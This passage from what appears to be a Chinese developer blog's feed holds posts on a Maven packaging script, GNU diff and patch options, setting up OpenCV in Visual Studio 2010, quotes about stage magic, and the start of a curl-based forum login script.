href="http://192.168.16.222:8081/nexus/index.html">http://192.168.16.222:8081/nexus/index.html</a>上面常用的私有的jar包</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.chinaroad<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>quickstart-archetype<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.chinaroad<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>redis4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><ol><li><strong>bin&#x2F;package.sh</strong>文件内容</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> [INFO] Package the jar <span class="keyword">in</span> target <span class="built_in">dir</span>.</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> pom.xml | sed <span class="string">&#x27;s/&lt;targetPath&gt;.\/&lt;\/targetPath&gt;/&lt;targetPath&gt;..\/&lt;\/targetPath&gt;/g&#x27;</span>  &gt; pom.xml.package</span><br><span class="line"><span class="built_in">mv</span> pom.xml pom.old</span><br><span class="line"><span class="built_in">mv</span> pom.xml.package pom.xml</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">set</span> targetPath = ../ <span class="keyword">for</span> mvn package</span><br><span class="line"></span><br><span class="line">mvn clean package -Dmaven.test.skip=<span class="literal">true</span></span><br><span class="line"><span class="built_in">rm</span> pom.xml</span><br><span class="line"><span class="built_in">mv</span> pom.old pom.xml</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> target</span><br><span class="line"><span class="built_in">echo</span> jar file builed found</span><br><span class="line">find ./ -maxdepth 1 -name <span class="string">&#x27;*.jar&#x27;</span> -<span class="built_in">type</span> f</span><br><span class="line"><span class="built_in">echo</span> rename jar file with parckage <span class="built_in">date</span>...</span><br><span class="line">JARTIME=`<span class="built_in">date</span> +%F<span class="string">&quot;-&quot;</span>%H%M%S | sed <span class="string">&#x27;s/-//g&#x27;</span> | awk <span class="string">&#x27;&#123;print $1&quot;.jar&quot;&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">FILENAMES=`find ./ -maxdepth 1 -name <span class="string">&#x27;*.jar&#x27;</span> -<span class="built_in">type</span> f`</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> <span class="variable">$FILENAMES</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  jarName=`<span class="built_in">echo</span> <span class="variable">$file</span> | sed <span class="string">&#x27;s/jar//g&#x27;</span> | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span>`</span><br><span class="line">  jarName=$jarName<span class="variable">$JARTIME</span></span><br><span class="line">  <span class="built_in">mv</span> <span class="variable">$file</span> <span class="variable">$jarName</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> rename jar end...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Maven </tag>
            
            <tag> 构建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>diff命令的好用功能</title>
      <link href="/2014/01/22/diff%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A5%BD%E7%94%A8%E5%8A%9F%E8%83%BD/"/>
      <url>/2014/01/22/diff%E5%91%BD%E4%BB%A4%E7%9A%84%E5%A5%BD%E7%94%A8%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<p>GNU diff有很多功能平时我们不常用到，但若知道，在急需时还真能派得上用场,尤其是他妈的说要更新线上代码的时候。</p><p>最常用的功能莫过于生成patch文件了：</p><pre><code>diff -urN old/ new/ &gt; mysoft.patch</code></pre><span id="more"></span><p>参数 <code>-u</code> 表示使用 <code>unified</code>格式，<code>-r</code> 表示比较目录，<code>-N</code> 表示将不存在的文件当作空文件处理， 这样新添加的文件也会出现在patch文件中。</p><p>然后在需要应用patch的地方使用下述命令即可：</p><pre><code>patch -p0 &lt; mysoft.patch</code></pre><p>diff的 <code>-y</code> 命令（长格式为<code>--side-by-side</code>）可以将屏幕分成左右两部分，来比较两个文件之间的差异。<br>许多图形化的比较工具都有这个功能，但如果只能使用命令行，这个参数就相当有用了。 如果要改变左右各部分的宽度，可以通过<code> -W（--width）</code>参数来指定。  </p><p>此外，<code>--strip-trailing-cr</code> 参数可以去除行尾的换行，这样DOS格式和Unix格式的文件互相比较时， 就不至于因为换行符不一致而出现大量的差异。</p><p>patch</p><pre><code>－－－－－－－－－－－－－－－－－－NAME   patch - apply a diff file to an originalSYNOPSIS   patch [options] [originalfile [patchfile]]   but usually just   patch -pnum &lt;patchfile&gt;－－－－－－－－－－－－－－－－－－</code></pre><p>简单的说，patch就是利用diff制作的补丁来实现源文件（夹）和目的文件（夹）的转换。这样说就意味着你可以有源文件（夹）–&gt; 目的文件（夹），也可以目的文件（夹）–&gt; 源文件（夹）。下面介绍几个最常用选项：</p><pre><code>-p0 选项要从当前目录查找目的文件（夹）-p1 选项要忽略掉第一层目录，从当前目录开始查找。</code></pre><h4 id="patch文件的结构"><a href="#patch文件的结构" class="headerlink" title="patch文件的结构"></a>patch文件的结构</h4><h5 id="补丁头"><a href="#补丁头" class="headerlink" title="补丁头"></a>补丁头</h5><p>补丁头是分别由—&#x2F;+++开头的两行，用来表示要打补丁的文件。—开头表示旧文件，+++开头表示新文件。</p><p>一个补丁文件中的多个补丁</p><p>一个补丁文件中可能包含以—&#x2F;+++开头的很多节，每一节用来打一个补丁。所以在一个补丁文件中可以包含好多个补丁。</p><h5 id="块"><a href="#块" class="headerlink" title="块"></a>块</h5><p>块是补丁中要修改的地方。它通常由一部分不用修改的东西开始和结束。他们只是用来表示要修改的位置。他们通常以@@开始，结束于另一个块的开始或者一个新的补丁头。</p><h5 id="块的缩进"><a href="#块的缩进" class="headerlink" title="块的缩进"></a>块的缩进</h5><p>块会缩进一列，而这一列是用来表示这一行是要增加还是要删除的。<br>块的第一列</p><p>+号表示这一行是要加上的。</p><p>-号表示这一行是要删除的。</p><p>没有加号也没有减号表示这里只是引用的而不需要修改。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">   用法：diff [选项]... FILES</span><br><span class="line">逐行比较文件。</span><br><span class="line"></span><br><span class="line">  -i  --ignore-case  忽略文件内容大小写的区别。</span><br><span class="line">  --ignore-file-name-case  忽略文件名大小写的区别。</span><br><span class="line">  --no-ignore-file-name-case  不忽略文件名大小写的区别。</span><br><span class="line">  -E  --ignore-tab-expansion  忽略由制表符宽度造成的差异。</span><br><span class="line">  -b  --ignore-space-change  忽略由空格数不同造成的差异。</span><br><span class="line">  -w  --ignore-all-space   忽略所有空格。</span><br><span class="line">  -B  --ignore-blank-lines  忽略任何因空行而造成的差异。</span><br><span class="line">  -I RE  --ignore-matching-lines=RE  如果某行匹配正则表达式，则忽略由该行造成的差异。</span><br><span class="line">  --strip-trailing-cr  去除输入内容每行末端的 carriage <span class="built_in">return</span> 字符。</span><br><span class="line">  -a  --text  所有文件都以文本方式处理。</span><br><span class="line"></span><br><span class="line">  -c  -C 行数  --context[=行数]  显示指定&lt;行数&gt;(默认 3 行)copied 格式的上下文</span><br><span class="line">  -u  -U 行数  --unified[=行数]  显示指定&lt;行数&gt;(默认 3 行)unified 格式的上下文</span><br><span class="line">     --label 标识                       使用&lt;标识&gt;代替文件名称。</span><br><span class="line">     -p  --show-c-function           显示和每个差异有关的 C 函数名称。</span><br><span class="line">    -F RE  --show-function-line=RE  显示最接近而符合&lt;正则表示式&gt;的一行。</span><br><span class="line">  -q  --brief  只显示文件是否不同。</span><br><span class="line">  -e  --ed 以 ed script 方式输出。</span><br><span class="line">  --normal 以正常的 diff 方式输出。</span><br><span class="line">  -n  --rcs  以 RCS diff 格式输出。</span><br><span class="line">  -y  --side-by-side         以两列并排的方式显示。</span><br><span class="line">    -W NUM  --width=NUM      每行显示最多 NUM (默认 130) 个字符。</span><br><span class="line">    --left-column            当有两行相同时只显示左边的一行。</span><br><span class="line">    --suppress-common-lines  当有两行相同时不会显示。</span><br><span class="line">  -D NAME  --ifdef=NAME  输出的内容以‘<span class="comment">#ifdef NAME’方式标明差异。</span></span><br><span class="line">  --GTYPE-group-format=GFMT  效果类似，但会以 GFMT 格式处理 GTYPE 输入的行。</span><br><span class="line">  --line-format=LFMT  效果类似，但会以 LFMT 格式处理每一行资料。</span><br><span class="line">  --LTYPE-line-format=LFMT   效果类似，但会以 LFMT 格式处理 LTYPE 输入的行。</span><br><span class="line">    LTYPE 可以是‘old’、‘new’或‘unchanged’。GTYPE 可以是 LTYPE 的选择</span><br><span class="line">    或是‘changed’。</span><br><span class="line">    GFMT 可包括：</span><br><span class="line">      %&lt;  该组中每行属于 FILE1 的差异</span><br><span class="line">      %&gt;  该组中每行属于 FILE2 的差异</span><br><span class="line">      %=  该组中同时在 FILE1 和 FILE2 出现的每一行</span><br><span class="line">      %[-][宽度][.[精确度]]&#123;doxX&#125;字符  以 <span class="built_in">printf</span> 格式表示该&lt;字符&gt;代表的内容</span><br><span class="line">        大写&lt;字符&gt;表示属于新的文件，小写表示属于旧的文件。&lt;字符&gt;的意义如下：</span><br><span class="line">          F  行组中第一行的行号</span><br><span class="line">          L  行组中最后一行的行号</span><br><span class="line">          N  行数 ( =L-F+1 )</span><br><span class="line">          E  F-1</span><br><span class="line">          M  L+1</span><br><span class="line">    LFMT 可包括：</span><br><span class="line">      %L  该行的内容</span><br><span class="line">      %l  该行的内容，但不包括结束的 newline 字符</span><br><span class="line">      %[-][宽度][.[精确度]]&#123;doxX&#125;n  以 <span class="built_in">printf</span> 格式表示的输入资料行号</span><br><span class="line">    GFMT 或 LFMT 可包括：</span><br><span class="line">      %%        %</span><br><span class="line">      %c<span class="string">&#x27;C&#x27;</span>     字符 C</span><br><span class="line">      %c<span class="string">&#x27;\OOO&#x27;</span>  八进制数字OOO所代表的字符</span><br><span class="line"></span><br><span class="line">  -l  --paginate 将输出送至‘<span class="built_in">pr</span>’指令来分页。</span><br><span class="line">  -t  --expand-tabs  将输出中的 tab 转换成空格。</span><br><span class="line">  -T  --initial-tab  每行先加上 tab 字符，使 tab 字符可以对齐。</span><br><span class="line"></span><br><span class="line">  -r  --recursive  连同所有子目录一起比较。</span><br><span class="line">  -N  --new-file  不存在的文件以空文件方式处理。</span><br><span class="line">  --unidirectional-new-file  若第一文件案不存在，以空文件处理。</span><br><span class="line">  -s  --report-identical-files   当两个一样时仍然显示结果。</span><br><span class="line">  -x PAT  --exclude=PAT  排除匹配 PAT 的文件。</span><br><span class="line">  -X FILE  --exclude-from=FILE   排除所有匹配在 FILE 中列出的模式的文件。</span><br><span class="line">  -S FILE  --starting-file=FILE  当比较目录時，由 FILE 开始比较。</span><br><span class="line">  --from-file=FILE1  将 FILE1 和操作数中的所有文件/目录作比较。FILE1 可以是目录。</span><br><span class="line">  --to-file=FILE2    将操作数中的所有文件/目录和 FILE2 作比较。FILE2 可以是目录。</span><br><span class="line"></span><br><span class="line">  --horizon-lines=NUM      (此选项不做处理)</span><br><span class="line">  -d  --minimal  尽可能找出最小的差异。</span><br><span class="line">  --speed-large-files     假设文件十分大而且其中含有许多微小的差异。</span><br><span class="line"></span><br><span class="line">  -v  --version  输出版本信息。</span><br><span class="line">  --<span class="built_in">help</span>  输入本帮助。</span><br><span class="line"></span><br><span class="line">  FILES 的格式可以是‘FILE1 FILE2’、‘DIR1 DIR2’、‘DIR FILE...’或</span><br><span class="line">      ‘FILE... DIR’。</span><br><span class="line">如果使用 --from-file 或 --to-file 选项，FILES 的格式则不受限制。</span><br><span class="line">如果 FILE 是‘-’，则由标准输入读取内容。</span><br><span class="line"></span><br><span class="line">请向 &lt;bug-gnu-utils@gnu.org&gt; 报告错误。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> diff </tag>
            
            <tag> patch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenCV安装教程，配置，注意事项</title>
      <link href="/2014/01/07/OpenCV%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%EF%BC%8C%E9%85%8D%E7%BD%AE%EF%BC%8C%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/"/>
      <url>/2014/01/07/OpenCV%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B%EF%BC%8C%E9%85%8D%E7%BD%AE%EF%BC%8C%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<p>本文将介绍OpenCV + Windows visual studio 2010安装过程，以及第一个例子。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul><li>openCV基本介绍</li><li>OpenCV下载、安装和配置</li><li>Windows visual studio 2010安装过程和配置</li><li>安装过程遇到的问题</li><li>第一个例子Quickstart.cpp</li></ul><span id="more"></span><h3 id="OpenCV基本介绍"><a href="#OpenCV基本介绍" class="headerlink" title="OpenCV基本介绍"></a>OpenCV基本介绍</h3><p><a href="http://opencv.org/">OpenCV</a>(open source computer vision library)是一个基于C&#x2F;C++语言的开源图像函数处理库。<br>可以运行在Linux、Windows和Mac OS操作系统上。它轻量级而且高效——由一系列 C 函数和少量 C++ 类构成，同时提供了Python、Ruby、MATLAB等语言的接口，实现了图像处理和计算机视觉方面的很多通用算法。它的主要模块包括：</p><ul><li>cv —— 核心函数库</li><li>cvaux —— 辅助函数库</li><li>cxcore —— 数据结构与线性代数库</li><li>highgui —— GUI函数库</li><li>ml —— 机器学习函数库</li></ul><p>opencv是跨平台的，支持包括windows、unix以及android等平台。关于opencv的一系列功能以及特性，本文不再赘述，如果要了解，请购买书籍O’Reilly：<a href="http://item.jd.com/10080298.html">学习OpenCV（中文版）</a></p><h3 id="OpenCV下载以及安装"><a href="#OpenCV下载以及安装" class="headerlink" title="OpenCV下载以及安装"></a>OpenCV下载以及安装</h3><p>OpenCV提供Windows、Linux&#x2F;Mac、Android、IOS安装工具，可直接前往<a href="http://opencv.org/">OpenCV官网</a>下载，这里以下载Windows版本为例，进行说明。</p><ul><li>前往<a href="http://opencv.org/">OpenCV官网</a>下载Windows版本,目前最新版本为2.4.8。这种方式很傻瓜，直接双击解压到%opencv%（凡是出现%opencv%的地方均替换为你自己opencv的路径全名，如D:\opencv）。</li><li>配置OpenCV环境变量。<br>计算机-&gt;（右键）属性-&gt;高级系统设置-&gt;高级（标签）-&gt;环境变量-&gt;（双击）path（用户，系统里面的path任选其一）-&gt;在变量值里面添加” %opencv%\build\x86\vc10\bin”和”%opencv%\build\common\tbb\ia32\vc10”（里面的%opencv%记得换成自己的opencv路径)。注意如果是系统的环境变量，可能需要重新启动机器，不然设置的path变量不会立即生效。</li></ul><h3 id="Windows-visual-studio-2010安装过程和配置"><a href="#Windows-visual-studio-2010安装过程和配置" class="headerlink" title="Windows visual studio 2010安装过程和配置"></a>Windows visual studio 2010安装过程和配置</h3><p>直接下载，不断Next就行了。微软的东西基本都是Next。这里忽略<br>配置工程的opencv依赖（每次新建工程都要重新配置，要执行此步骤请先跳到第4步建立工程）</p><ol><li>项目（菜单项）-&gt;…属性-&gt;VC++目录：需要配置“包含目录”和“库目录”两项。<img src="/assets/images/2014010801.png" alt="alt text" title="Title"></li><li>配置“包含目录”项：添加行”%opencv%\build\include”即可。<br>但在运行别人的opencv项目时，可能别人直接引用了上述目录的子目录路径，如果出现include错误，则再添加”%opencv%\build\include\opencv”和（或）”%opencv%\build\include\opencv2”，即可解决问题。<img src="/assets/images/2014010802.png" alt="alt text" title="Title"></li><li>配置“库目录”项：添加行”%opencv%\build\x86\vc10\lib”即可。<img src="/assets/images/2014010803.png" alt="alt text" title="Title"></li><li>配置连接器：项目（菜单项）-&gt;…属性-&gt;连接器-&gt;输入-&gt;附加依赖项<br>针对debug配置添加以下库： <code>find ./ -name &#39;*d.lib&#39; -type f | sed &#39;s/\.\///g&#39;</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">opencv_calib3d248d.lib</span><br><span class="line">opencv_contrib248d.lib</span><br><span class="line">opencv_core248d.lib</span><br><span class="line">opencv_features2d248d.lib</span><br><span class="line">opencv_flann248d.lib</span><br><span class="line">opencv_gpu248d.lib</span><br><span class="line">opencv_highgui248d.lib</span><br><span class="line">opencv_imgproc248d.lib</span><br><span class="line">opencv_legacy248d.lib</span><br><span class="line">opencv_ml248d.lib</span><br><span class="line">opencv_nonfree248d.lib</span><br><span class="line">opencv_objdetect248d.lib</span><br><span class="line">opencv_ocl248d.lib</span><br><span class="line">opencv_photo248d.lib</span><br><span class="line">opencv_stitching248d.lib</span><br><span class="line">opencv_superres248d.lib</span><br><span class="line">opencv_ts248d.lib</span><br><span class="line">opencv_video248d.lib</span><br><span class="line">opencv_videostab248d.lib</span><br></pre></td></tr></table></figure> 如果是release配置（以后再说，只需要添加上面的debug配置就行了现在），则添加：<code> find ./ -name &#39;*8.lib&#39; -type f | sed &#39;s/\.\///g&#39;</code></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">opencv_calib3d248.lib</span><br><span class="line">opencv_contrib248.lib</span><br><span class="line">opencv_core248.lib</span><br><span class="line">opencv_features2d248.lib</span><br><span class="line">opencv_flann248.lib</span><br><span class="line">opencv_gpu248.lib</span><br><span class="line">opencv_highgui248.lib</span><br><span class="line">opencv_imgproc248.lib</span><br><span class="line">opencv_legacy248.lib</span><br><span class="line">opencv_ml248.lib</span><br><span class="line">opencv_nonfree248.lib</span><br><span class="line">opencv_objdetect248.lib</span><br><span class="line">opencv_ocl248.lib</span><br><span class="line">opencv_photo248.lib</span><br><span class="line">opencv_stitching248.lib</span><br><span class="line">opencv_superres248.lib</span><br><span class="line">opencv_ts248.lib</span><br><span class="line">opencv_video248.lib</span><br><span class="line">opencv_videostab248.lib</span><br></pre></td></tr></table></figure><p><img src="/assets/images/2014010804.png" alt="alt text" title="Title"></p><p><strong>注意：</strong></p><pre><code>- 每个lib文件的文件名都是以248结尾的，这里248应该是代表版本号，不同的版本是不一样的，不然添加到VS里面一样提示找不到lib文件。- 如果仍旧提示找不到lib文件，可尝试重启VS或者重启电脑。</code></pre><h3 id="第一个例子Quickstart-cpp"><a href="#第一个例子Quickstart-cpp" class="headerlink" title="第一个例子Quickstart.cpp"></a>第一个例子Quickstart.cpp</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;StdAfx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;opencv2\opencv.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;cv.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;highgui.h&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> cv;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">IplImage *img = <span class="built_in">cvLoadImage</span>(<span class="string">&quot;hello-long.jpg&quot;</span>);<span class="comment">//图片文件地址，支持绝对路径</span></span><br><span class="line"><span class="built_in">cvNamedWindow</span>(<span class="string">&quot;龙哥&quot;</span>,<span class="number">1</span>);<span class="comment">//1是不可拖动，0为可拖动窗口</span></span><br><span class="line"><span class="built_in">cvShowImage</span>(<span class="string">&quot;龙哥&quot;</span>,img);<span class="comment">//显示图片</span></span><br><span class="line"><span class="built_in">cvWaitKey</span>(<span class="number">0</span>);<span class="comment">//阻塞在此，直到按下一个键，运行</span></span><br><span class="line"><span class="built_in">cvReleaseImage</span>(&amp;img);<span class="comment">//释放内存</span></span><br><span class="line"><span class="built_in">cvDestroyWindow</span>(<span class="string">&quot;龙哥&quot;</span>);<span class="comment">//销毁窗口</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>照片就不贴了。。。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenCV </tag>
            
            <tag> 图像处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Magic or Trick</title>
      <link href="/2013/12/24/Magic%20or%20Trick/"/>
      <url>/2013/12/24/Magic%20or%20Trick/</url>
      
        <content type="html"><![CDATA[<p>每一场魔术表演都有三个步骤。第一个步骤是“以虚代实”：魔术师秀出一个真实的东西，一副牌、一只鸟或一个人，让你看这样东西，叫你检视它，看它的确是真的，平常的不得了。但是，其中一定有假。第二个步骤是“偷天换日”，魔术师利用这个普通的东西，做出令人叹为观止的表演，现在你很想找出秘诀，但是绝对找不到。因为你根本没有真正在看，你并不是真的想知道，你想要被骗。但是你还不会鼓掌，因为把东西变不见还不够，你必须把它变回来。所以魔术都有第三个步骤，最难的部分，我们称之为“化腐朽为神奇”。</p><span id="more"></span><p>如果大家把我的表演当真，就不会鼓掌，只会尖叫。</p><p>你不懂我们为什么要变魔术？观众知道真相。现实既残酷又悲惨。没有奇迹，没有魔法。但是如果你能骗倒他们，即使只有一秒钟，就能让他们惊叹，然后你就能… 然后你就能看到非常特别的事。你真的不知道吗？那就是观众脸上的表情。</p><p>魔术的秘密没啥了不起，变魔术的技巧才重要。</p><p>自我牺牲才是精彩魔术的代价。</p><p>你听过这句俗话吗？“心有余而力不足”。那不是真话，人类只是胆量不够。社会一次只能接受一种改变。我第一次试着改变世界，被称为先知；第二次他们却请我退休。所以我在这里享受退休时光。没有不可能的事，只是你所要想的是否值得。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 魔术 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>curl_sed_awk初探之清水河畔登录脚本</title>
      <link href="/2013/10/31/curl_sed_awk%E5%88%9D%E6%8E%A2%E4%B9%8B%E6%B8%85%E6%B0%B4%E6%B2%B3%E7%95%94%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/"/>
      <url>/2013/10/31/curl_sed_awk%E5%88%9D%E6%8E%A2%E4%B9%8B%E6%B8%85%E6%B0%B4%E6%B2%B3%E7%95%94%E7%99%BB%E5%BD%95%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="登录脚本源码"><a href="#登录脚本源码" class="headerlink" title="登录脚本源码"></a>登录脚本源码</h1> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author:yuer</span></span><br><span class="line"><span class="comment">#移除临时文件temp*.html</span></span><br><span class="line"><span class="built_in">rm</span> -rf temp*.html</span><br><span class="line"><span class="comment">#访问登录页面，获取以后要获得的三个值，具体三个值可以通过登录抓包看到，将返回结果的cookie保存到cookie.txt中，将返回的html保存到temp.htm中</span></span><br><span class="line">    </span><br><span class="line">curl -D cookie.txt -s <span class="string">&quot;http://bbs.stuhome.net/member.php?mod=logging&amp;action=login&quot;</span> &gt; temp.html</span><br><span class="line"><span class="comment">#for get formhash variable</span></span><br><span class="line">formhash=`<span class="built_in">cat</span> temp.html | sed -n <span class="string">&#x27;/&quot;formhash&quot;/p&#x27;</span> | sed <span class="string">&#x27;s/&quot;//g&#x27;</span> | awk <span class="string">&#x27;&#123;print $4&#125;&#x27;</span> | sed <span class="string">&#x27;s/value=//g&#x27;</span>|sed q`</span><br><span class="line"><span class="comment">#for get loginhash variable</span></span><br><span class="line">loginhash=`<span 